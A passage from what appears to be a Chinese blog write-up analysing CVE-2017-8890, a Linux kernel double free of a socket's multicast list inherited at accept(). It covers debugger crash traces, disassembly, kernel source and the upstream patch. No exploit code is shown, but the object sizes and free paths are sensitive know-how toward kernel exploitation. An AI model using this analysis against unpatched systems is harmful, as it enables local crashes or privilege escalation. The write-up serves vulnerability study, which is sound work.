ip_mc_leave_src (sk=0xffff88003a10f800, iml=0xffff88003a6cac40, in_dev=0x0 &lt;irq_stack_union&gt;) at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/net/ipv4/igmp.c:2155</span><br><span class="line">#1  0xffffffff81832f18 in ip_mc_drop_socket (sk=0xffff88003a10f800) at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/net/ipv4/igmp.c:2607</span><br><span class="line">#2  0xffffffff8182c2c0 in inet_release (sock=0xffff8800383c3200) at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/net/ipv4/af_inet.c:411</span><br><span class="line">#3  0xffffffff8178b7bf in sock_release (sock=0x0 &lt;irq_stack_union&gt;) at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/net/socket.c:599</span><br><span class="line">#4  0xffffffff8178b832 in sock_close (inode=&lt;optimized out&gt;, filp=&lt;optimized out&gt;) at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/net/socket.c:1063</span><br><span class="line">#5  0xffffffff81246937 in __fput (file=0xffff8800341ea200) at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/fs/file_table.c:209</span><br><span class="line">#6  0xffffffff81246ade in ____fput (work=&lt;optimized out&gt;) at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/fs/file_table.c:245</span><br><span class="line">#7  0xffffffff810a706e in task_work_run () at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/kernel/task_work.c:116</span><br><span class="line">#8  0xffffffff810032ba in tracehook_notify_resume (regs=&lt;optimized out&gt;) at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/include/linux/tracehook.h:191</span><br><span class="line">#9  exit_to_usermode_loop (regs=0xffffc90003a0bf58, cached_flags=0x2) at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/arch/x86/entry/common.c:160</span><br><span class="line">#10 0xffffffff81003b29 in prepare_exit_to_usermode (regs=&lt;optimized out&gt;) at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/arch/x86/entry/common.c:190</span><br><span class="line">#11 syscall_return_slowpath (regs=0xffffc90003a0bf58) at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/arch/x86/entry/common.c:259</span><br><span class="line">#12 0xffffffff818ce948 in entry_SYSCALL_64 () at /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/arch/x86/entry/entry_64.S:239</span><br><span class="line">#13 0x0000000000000000 in ?? ()</span><br><span class="line">gef➤  l</span><br><span class="line">2150if (!psf) &#123;</span><br><span class="line">2151/* any-source empty exclude case */</span><br><span class="line">2152return ip_mc_del_src(in_dev, &amp;iml-&gt;multi.imr_multiaddr.s_addr,</span><br><span class="line">2153iml-&gt;sfmode, 0, NULL, 0);</span><br><span class="line">2154&#125;</span><br><span class="line">2155err = ip_mc_del_src(in_dev, &amp;iml-&gt;multi.imr_multiaddr.s_addr,</span><br><span class="line">2156iml-&gt;sfmode, psf-&gt;sl_count, psf-&gt;sl_addr, 0);</span><br><span class="line">2157RCU_INIT_POINTER(iml-&gt;sflist, NULL);</span><br><span class="line">2158/* decrease mem now to avoid the memleak warning */</span><br><span class="line">2159atomic_sub(IP_SFLSIZE(psf-&gt;sl_max), &amp;sk-&gt;sk_omem_alloc);</span><br><span class="line">gef➤  info registers </span><br><span class="line">rax            0x00x0</span><br><span class="line">rbx            0x20x2</span><br><span class="line">...</span><br><span class="line">gef➤  x /50i ip_mc_leave_src</span><br><span class="line">   0xffffffff8182f480 &lt;ip_mc_leave_src&gt;:nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0xffffffff8182f485 &lt;ip_mc_leave_src+5&gt;:push   rbp</span><br><span class="line">   0xffffffff8182f486 &lt;ip_mc_leave_src+6&gt;:mov    rbp,rsp</span><br><span class="line">   0xffffffff8182f489 &lt;ip_mc_leave_src+9&gt;:push   r14</span><br><span class="line">   0xffffffff8182f48b &lt;ip_mc_leave_src+11&gt;:push   r13</span><br><span class="line">   0xffffffff8182f48d &lt;ip_mc_leave_src+13&gt;:push   r12</span><br><span class="line">   0xffffffff8182f48f &lt;ip_mc_leave_src+15&gt;:push   rbx</span><br><span class="line">   0xffffffff8182f490 &lt;ip_mc_leave_src+16&gt;:mov    r14,rdi</span><br><span class="line">   0xffffffff8182f493 &lt;ip_mc_leave_src+19&gt;:mov    rbx,QWORD PTR [rsi+0x18]</span><br><span class="line">   0xffffffff8182f497 &lt;ip_mc_leave_src+23&gt;:mov    r12,rsi</span><br><span class="line">   0xffffffff8182f49a &lt;ip_mc_leave_src+26&gt;:mov    rdi,rdx</span><br><span class="line">   0xffffffff8182f49d &lt;ip_mc_leave_src+29&gt;:test   rbx,rbx</span><br><span class="line">   0xffffffff8182f4a0 &lt;ip_mc_leave_src+32&gt;:je     0xffffffff8182f4ef &lt;ip_mc_leave_src+111&gt;</span><br><span class="line">   0xffffffff8182f4a2 &lt;ip_mc_leave_src+34&gt;:mov    edx,DWORD PTR [rsi+0x14]</span><br><span class="line">=&gt; 0xffffffff8182f4a5 &lt;ip_mc_leave_src+37&gt;:mov    ecx,DWORD PTR [rbx+0x4]---&gt;crash</span><br><span class="line">   0xffffffff8182f4a8 &lt;ip_mc_leave_src+40&gt;:lea    rsi,[rsi+0x8]</span><br><span class="line">   0xffffffff8182f4ac &lt;ip_mc_leave_src+44&gt;:lea    r8,[rbx+0x18]</span><br><span class="line">   0xffffffff8182f4b0 &lt;ip_mc_leave_src+48&gt;:xor    r9d,r9d</span><br><span class="line">   0xffffffff8182f4b3 &lt;ip_mc_leave_src+51&gt;:call   0xffffffff8182f110 &lt;ip_mc_del_src&gt;</span><br><span class="line">   0xffffffff8182f4b8 &lt;ip_mc_leave_src+56&gt;:mov    QWORD PTR [r12+0x18],0x0</span><br><span class="line">   0xffffffff8182f4c1 &lt;ip_mc_leave_src+65&gt;:mov    r13d,eax</span><br><span class="line">   0xffffffff8182f4c4 &lt;ip_mc_leave_src+68&gt;:mov    eax,DWORD PTR [rbx]</span><br><span class="line">   0xffffffff8182f4c6 &lt;ip_mc_leave_src+70&gt;:lea    eax,[rax*4+0x18]</span><br><span class="line">   0xffffffff8182f4cd &lt;ip_mc_leave_src+77&gt;:sub    DWORD PTR ds:[r14+0x138],eax</span><br><span class="line">   0xffffffff8182f4d5 &lt;ip_mc_leave_src+85&gt;:lea    rdi,[rbx+0x8]</span><br><span class="line">   0xffffffff8182f4d9 &lt;ip_mc_leave_src+89&gt;:mov    esi,0x8</span><br><span class="line">   0xffffffff8182f4de &lt;ip_mc_leave_src+94&gt;:call   0xffffffff810f4a40 &lt;kfree_call_rcu&gt;</span><br><span class="line">   0xffffffff8182f4e3 &lt;ip_mc_leave_src+99&gt;:pop    rbx</span><br><span class="line">   0xffffffff8182f4e4 &lt;ip_mc_leave_src+100&gt;:mov    eax,r13d</span><br><span class="line">   0xffffffff8182f4e7 &lt;ip_mc_leave_src+103&gt;:pop    r12</span><br><span class="line">   0xffffffff8182f4e9 &lt;ip_mc_leave_src+105&gt;:pop    r13</span><br><span class="line">   0xffffffff8182f4eb &lt;ip_mc_leave_src+107&gt;:pop    r14</span><br><span class="line">   0xffffffff8182f4ed &lt;ip_mc_leave_src+109&gt;:pop    rbp</span><br><span class="line">   0xffffffff8182f4ee &lt;ip_mc_leave_src+110&gt;:ret    </span><br><span class="line">   0xffffffff8182f4ef &lt;ip_mc_leave_src+111&gt;:mov    edx,DWORD PTR [rsi+0x14]</span><br><span class="line">   0xffffffff8182f4f2 &lt;ip_mc_leave_src+114&gt;:lea    rsi,[rsi+0x8]</span><br><span class="line">   0xffffffff8182f4f6 &lt;ip_mc_leave_src+118&gt;:xor    r9d,r9d</span><br><span class="line">   0xffffffff8182f4f9 &lt;ip_mc_leave_src+121&gt;:xor    r8d,r8d</span><br><span class="line">   0xffffffff8182f4fc &lt;ip_mc_leave_src+124&gt;:xor    ecx,ecx</span><br><span class="line">   0xffffffff8182f4fe &lt;ip_mc_leave_src+126&gt;:call   0xffffffff8182f110 &lt;ip_mc_del_src&gt;</span><br><span class="line">   0xffffffff8182f503 &lt;ip_mc_leave_src+131&gt;:pop    rbx</span><br><span class="line">   0xffffffff8182f504 &lt;ip_mc_leave_src+132&gt;:pop    r12</span><br><span class="line">   0xffffffff8182f506 &lt;ip_mc_leave_src+134&gt;:pop    r13</span><br><span class="line">   0xffffffff8182f508 &lt;ip_mc_leave_src+136&gt;:pop    r14</span><br><span class="line">   0xffffffff8182f50a &lt;ip_mc_leave_src+138&gt;:pop    rbp</span><br><span class="line">   0xffffffff8182f50b &lt;ip_mc_leave_src+139&gt;:ret</span><br></pre></td></tr></table></figure></p><p>通过打印堆栈和查看源码/分析汇编，我们知道kernel panic的原因是NULL pointer dereference at 0000000000000006。</p><p>关键代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">if (!psf) &#123;</span><br><span class="line">2151/* any-source empty exclude case */</span><br><span class="line">2152return ip_mc_del_src(in_dev, &amp;iml-&gt;multi.imr_multiaddr.s_addr,</span><br><span class="line">2153iml-&gt;sfmode, 0, NULL, 0);</span><br><span class="line">2154&#125;</span><br><span class="line">2155err = ip_mc_del_src(in_dev, &amp;iml-&gt;multi.imr_multiaddr.s_addr,</span><br><span class="line">2156iml-&gt;sfmode, psf-&gt;sl_count, psf-&gt;sl_addr, 0);</span><br><span class="line">2157RCU_INIT_POINTER(iml-&gt;sflist, NULL);</span><br><span class="line">2158/* decrease mem now to avoid the memleak warning */</span><br><span class="line">2159atomic_sub(IP_SFLSIZE(psf-&gt;sl_max), &amp;sk-&gt;sk_omem_alloc);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">=&gt; 0xffffffff8182f4a5 &lt;ip_mc_leave_src+37&gt;:mov    ecx,DWORD PTR [rbx+0x4]---&gt;crash</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">gef➤  info registers </span><br><span class="line">rbx            0x2</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ip_mc_leave_src</span><span class="params">(struct sock *sk, struct ip_mc_socklist *iml,</span></span></span><br><span class="line"><span class="function"><span class="params">   struct in_device *in_dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// rbx = [rsi+0x18]---&gt;iml-&gt;sflist---&gt;psf</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_sf_socklist</span> *<span class="title">psf</span> = <span class="title">rtnl_dereference</span>(<span class="title">iml</span>-&gt;<span class="title">sflist</span>);</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!psf) &#123; <span class="comment">// ---&gt;test rbx, rbx; je err</span></span><br><span class="line"><span class="keyword">return</span> ip_mc_del_src(in_dev, &amp;iml-&gt;multi.imr_multiaddr.s_addr,</span><br><span class="line">iml-&gt;sfmode, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ecx = [rbx+0x4]---&gt;psf-&gt;sl_count</span></span><br><span class="line">err = ip_mc_del_src(in_dev, &amp;iml-&gt;multi.imr_multiaddr.s_addr,iml-&gt;sfmode, psf-&gt;sl_count, psf-&gt;sl_addr, <span class="number">0</span>);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_sf_socklist</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>sl_max;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>sl_count;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">//0x10字节大小的结构体</span></span><br><span class="line">__be32sl_addr[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br><span class="line">...</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="keyword">void</span> (*func)(struct callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="keyword">void</span> *))));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rcu_head callback_head</span></span><br></pre></td></tr></table></figure><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><h3 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h3><p>看资料和patch<br><a href="https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-8890" target="_blank" rel="noopener">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-8890</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The inet_csk_clone_lock function in net/ipv4/inet_connection_sock.c in the Linux kernel allows attackers to cause a denial of service (double free) or possibly have unspecified other impact by leveraging use of the accept system call. </span><br><span class="line">An unprivileged local user could use this flaw to induce kernel memory corruption on the system, leading to a crash. Due to the nature of the flaw, privilege escalation cannot be fully ruled out, although we believe it is unlikely.</span><br></pre></td></tr></table></figure></p><p>linux内核的net/ipv4/inet_connection_sock.c文件中的inet_csk_clone_lock函数允许攻击者利用accept system call去触发double free，造成拒绝服务攻击或者其他可能的影响。<br>一个没有特权的本地用户能够使用这个缺陷去触发系统内核内存损坏，导致系统崩溃。</p><p>patch<br><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=657831ffc38e30092a2d5f03d385d710eb88b09a" target="_blank" rel="noopener">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=657831ffc38e30092a2d5f03d385d710eb88b09a</a><br><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=8b485ce69876c65db12ed390e7f9c0d2a64eff2c" target="_blank" rel="noopener">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=8b485ce69876c65db12ed390e7f9c0d2a64eff2c</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">dccp/tcp: do not inherit mc_list from parent</span><br><span class="line">syzkaller found a way to trigger double frees from ip_mc_drop_socket()</span><br><span class="line"></span><br><span class="line">It turns out that leave a copy of parent mc_list at accept() time,</span><br><span class="line">which is very bad.</span><br><span class="line"></span><br><span class="line">Very similar to commit 8b485ce69876 (&quot;tcp: do not inherit</span><br><span class="line">fastopen_req from parent&quot;)</span><br><span class="line"></span><br><span class="line">Initial report from Pray3r, completed by Andrey one.</span><br><span class="line">Thanks a lot to them !</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">diff --git a/net/ipv4/inet_connection_sock.c b/net/ipv4/inet_connection_sock.c</span><br><span class="line">index 5e313c1..1054d33 100644</span><br><span class="line">--- a/net/ipv4/inet_connection_sock.c</span><br><span class="line">+++ b/net/ipv4/inet_connection_sock.c</span><br><span class="line">@@ -794,6 +794,8 @@ struct sock *inet_csk_clone_lock(const struct sock *sk,</span><br><span class="line"> /* listeners have SOCK_RCU_FREE, not the children */</span><br><span class="line"> sock_reset_flag(newsk, SOCK_RCU_FREE);</span><br><span class="line"> </span><br><span class="line">+inet_sk(newsk)-&gt;mc_list = NULL;</span><br><span class="line">+</span><br><span class="line"> newsk-&gt;sk_mark = inet_rsk(req)-&gt;ir_mark;</span><br><span class="line"> atomic64_set(&amp;newsk-&gt;sk_cookie,</span><br><span class="line">      atomic64_read(&amp;inet_rsk(req)-&gt;ir_cookie));</span><br></pre></td></tr></table></figure></p><p>patch前的源码<br><a href="https://elixir.bootlin.com/linux/v4.11.3/source/net/ipv4/inet_connection_sock.c" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v4.11.3/source/net/ipv4/inet_connection_sock.c</a><br>dccp/tcp: do not inherit mc_list from parent</p><p><strong>根据patch推测，在parent对象free了之后，由于child对象直接继承parent对象的值，于是又得到了mc_list的地址，在后面再次被free。</strong></p><h3 id="使用understand阅读源码"><a href="#使用understand阅读源码" class="headerlink" title="使用understand阅读源码"></a>使用understand阅读源码</h3><p>使用understand<br>我导入的源码是<a href="https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.10.tar.gz" target="_blank" rel="noopener">kernel4.10</a><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-17-033623.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-17-033659.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-17-033710.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-17-033851.png" alt=""><br>然后等它建立好索引后，搜索想看的函数，右键选择call by就可以自动绘制被调用图。</p><h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><h4 id="mc-list对象创建"><a href="#mc-list对象创建" class="headerlink" title="mc_list对象创建"></a>mc_list对象创建</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-17-025058.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-18-100222.jpg" alt=""><br>mc_list结构的定义如下，大小为0x30<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct ip_mc_socklist &#123;</span><br><span class="line">struct ip_mc_socklist __rcu *next_rcu;</span><br><span class="line">struct ip_mreqnmulti;</span><br><span class="line">unsigned intsfmode;/* MCAST_&#123;INCLUDE,EXCLUDE&#125; */</span><br><span class="line">struct ip_sf_socklist __rcu*sflist;</span><br><span class="line">struct rcu_headrcu;</span><br><span class="line">&#125;;</span><br><span class="line">struct callback_head &#123;</span><br><span class="line">struct callback_head *next;</span><br><span class="line">void (*func)(struct callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(sizeof(void *))));</span><br><span class="line">#define rcu_head callback_head</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b ip_mc_join_group</span><br><span class="line">gef➤  b sock_kmalloc</span><br></pre></td></tr></table></figure><p>然后单步<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180418/m7Bk5Djleb.png?imageslim" alt="mark"><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180418/0Ig78AkLI3.png?imageslim" alt="mark"></p><h4 id="mc-list对象释放"><a href="#mc-list对象释放" class="headerlink" title="mc_list对象释放"></a>mc_list对象释放</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sock_close -&gt; sock_release() -&gt;  inet_release() -&gt;  ip_mc_drop_socket()</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-19-032150.jpg" alt=""><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *A socket is closing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ip_mc_drop_socket</span><span class="params">(struct sock *sk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_sock</span> *<span class="title">inet</span> = <span class="title">inet_sk</span>(<span class="title">sk</span>);</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_mc_socklist</span> *<span class="title">iml</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> = <span class="title">sock_net</span>(<span class="title">sk</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!inet-&gt;mc_list)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">rtnl_lock();</span><br><span class="line"><span class="keyword">while</span> ((iml = rtnl_dereference(inet-&gt;mc_list)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_device</span> *<span class="title">in_dev</span>;</span></span><br><span class="line"></span><br><span class="line">inet-&gt;mc_list = iml-&gt;next_rcu;</span><br><span class="line">in_dev = inetdev_by_index(net, iml-&gt;multi.imr_ifindex);</span><br><span class="line">(<span class="keyword">void</span>) ip_mc_leave_src(sk, iml, in_dev);</span><br><span class="line"><span class="keyword">if</span> (in_dev)</span><br><span class="line">ip_mc_dec_group(in_dev, iml-&gt;multi.imr_multiaddr.s_addr);</span><br><span class="line"><span class="comment">/* decrease mem now to avoid the memleak warning */</span></span><br><span class="line">atomic_sub(<span class="keyword">sizeof</span>(*iml), &amp;sk-&gt;sk_omem_alloc);</span><br><span class="line">kfree_rcu(iml, rcu);</span><br><span class="line">&#125;</span><br><span class="line">rtnl_unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>ip_mc_drop_socket 这个函数导致释放操作,该函数获取到mc_list对象后，最后调用kfree_rcu，该函数并不是真正的释放该对象，而是调用call_rcu将要删除的对象保存起来，并标记或者开始一个宽限期，等到cpu宽限期结束，会触发一个RCU软中断，再进行释放，如果有回调函数func，则进行回调函数处理流程，整个函数调用逻辑为：kfree_rcu -&gt; … -&gt; call_rcu -&gt; … -&gt; invoke_rcu_core -&gt; RCU_SOFTIRQ -&gt; rcu_process_callbacks -&gt; … __rcu_reclaim</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-18-164437.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-18-164545.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b  /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/net/ipv4/igmp.c:2612 </span><br><span class="line">b  /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/kernel/rcu/rcu.h:113</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180418/GC1Ca1GHFJ.png?imageslim" alt="mark"><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/180419/1cjbECk5Ck.png?imageslim" alt="mark"></p><h4 id="accept"><a href="#accept" class="headerlink" title="accept"></a>accept</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-19-033114.jpg" alt=""><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *inet_csk_clone_lock - clone an inet socket, and lock its clone</span></span><br><span class="line"><span class="comment"> *@sk: the socket to clone</span></span><br><span class="line"><span class="comment"> *@req: request_sock</span></span><br><span class="line"><span class="comment"> *@priority: for allocation (%GFP_KERNEL, %GFP_ATOMIC, etc)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *Caller must unlock socket even in error path (bh_unlock_sock(newsk))</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">struct sock *<span class="title">inet_csk_clone_lock</span><span class="params">(<span class="keyword">const</span> struct sock *sk,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">const</span> struct request_sock *req,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">const</span> <span class="keyword">gfp_t</span> priority)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">newsk</span> = <span class="title">sk_clone_lock</span>(<span class="title">sk</span>, <span class="title">priority</span>);</span><span class="comment">//&lt;-----</span></span><br><span class="line">        ...</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> newsk;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct sock *<span class="title">sk_clone_lock</span><span class="params">(<span class="keyword">const</span> struct sock *sk, <span class="keyword">const</span> <span 